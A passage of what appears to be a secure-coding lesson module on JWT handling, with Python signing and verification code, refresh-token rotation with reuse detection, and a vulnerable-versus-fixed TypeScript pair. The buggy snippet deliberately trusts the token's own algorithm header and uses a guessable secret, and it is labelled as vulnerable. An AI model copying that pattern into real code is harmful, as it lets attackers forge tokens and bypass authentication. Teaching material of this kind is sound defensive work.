    header = json.loads(unb64(h))
    if header.get("alg") != "HS256":                 # server pins the algorithm
        raise ValueError("unexpected alg")
    expected = b64(hmac.new(secret, h + b"." + p, hashlib.sha256).digest())
    if not hmac.compare_digest(expected, s):
        raise ValueError("bad signature")
    claims = json.loads(unb64(p))
    if claims["exp"] < time.time():
        raise ValueError("expired")
    return claims

secret = b"\x8f" * 32                                 # demo only: use os.urandom(32)
tok = sign({"sub": "7", "exp": int(time.time()) + 600}, secret)
print(verify(tok, secret))`,
        },
        production: {
          language: 'py',
          filename: 'tokens.py',
          explanation: 'Production verification with PyJWT (pinned algorithm, required claims, audience/issuer) plus refresh-token rotation with reuse detection.',
          code: raw`import jwt, secrets, hashlib, time

def verify_access(token: str, public_key: str) -> dict:
    return jwt.decode(
        token,
        public_key,
        algorithms=["RS256"],                     # never ["RS256", "HS256"], never from header
        audience="api.example.com",
        issuer="https://auth.example.com",
        options={"require": ["exp", "iat", "sub", "aud", "iss"]},
        leeway=30,                                # small clock skew allowance
    )

# Refresh tokens: opaque random strings, stored HASHED, single use, grouped in a family
def rotate_refresh(db, presented: str) -> tuple[str, str]:
    h = hashlib.sha256(presented.encode()).hexdigest()
    row = db.get_refresh(h)
    if row is None:
        raise PermissionError("unknown token")
    if row.used_at is not None:                   # REUSE => stolen. Kill the whole family.
        db.revoke_family(row.family_id)
        raise PermissionError("refresh token reuse detected")
    db.mark_used(h, time.time())
    new_refresh = secrets.token_urlsafe(32)
    db.insert_refresh(hashlib.sha256(new_refresh.encode()).hexdigest(), row.family_id, row.user_id)
    return issue_access(row.user_id), new_refresh`,
        },
        bug: {
          explanation:
            'The vulnerable code reads the algorithm from the token and accepts any of them, uses a guessable secret, and never checks expiry or audience. The fix pins the algorithm, uses a strong key, and requires claims.',
          buggy: {
            language: 'ts',
            filename: 'auth.ts',
            code: raw`// ❌ Trusts the token's own header, weak secret, no claim checks
import jwt from 'jsonwebtoken';
const SECRET = 'secret123';                         // crackable offline in seconds

export function auth(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1] ?? '';
  const { header } = jwt.decode(token, { complete: true }) ?? {};
  req.user = jwt.verify(token, SECRET, { algorithms: [header?.alg] });  // attacker picks alg
  next();
}`,
          },
          fixed: {
            language: 'ts',
            filename: 'auth.ts',
            code: raw`// ✅ Pinned algorithm, asymmetric key, required claims
import jwt from 'jsonwebtoken';
const PUBLIC_KEY = process.env.JWT_PUBLIC_KEY!;     // private key lives only on the auth server

export function auth(req, res, next) {
  try {
    const token = req.headers.authorization?.replace(/^Bearer /, '') ?? '';
    req.user = jwt.verify(token, PUBLIC_KEY, {
      algorithms: ['RS256'],
      audience: 'api.example.com',
      issuer: 'https://auth.example.com',
      maxAge: '15m',
    });
    next();
  } catch {
    res.sendStatus(401);
  }
}`,
          },
        },
      },
      takeaways: [
        'JWT payloads are readable; signatures only prove integrity.',
        'Pin algorithms server-side; reject alg:none and algorithm confusion.',
        'Short-lived access tokens + rotating refresh tokens with reuse detection.',
        'Practice drill: decode a JWT from an app you own (header and payload) and list which of exp, iat, iss, aud and sub your server actually enforces.',
      ],
    },
  ],
};
